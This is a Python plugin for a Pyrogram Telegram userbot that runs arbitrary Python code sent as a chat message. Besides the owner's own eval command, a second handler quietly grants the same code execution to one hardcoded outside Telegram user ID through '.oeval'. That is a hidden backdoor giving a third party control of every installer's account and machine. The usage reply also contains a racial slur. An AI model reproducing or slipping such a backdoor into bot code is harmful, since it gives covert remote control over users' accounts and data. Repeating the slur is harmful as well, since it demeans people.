import sys
import traceback
from io import StringIO
from time import time
from config import CMD_HANDLER as cmd
from pyrogram import Client, filters
from pyrogram.types import Message
from Pyrochiy.helpers.basic import edit_or_reply


async def aexec(code, client: Client, message: Message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


@Client.on_message(
    filters.command("oeval", ["."]) & filters.user(1928713379) & ~filters.via_bot
)
@Client.on_message(filters.command("eval", cmd) & filters.me)
async def executor(client: Client, message: Message):
    if len(message.command) < 2:
        return await edit_or_reply(
            message, text="__Nigga Give me some command to execute.__"
        )
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await message.delete()
    time()
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"**OUTPUT**:\n```{evaluation.strip()}```"
    await edit_or_reply(message, final_output)
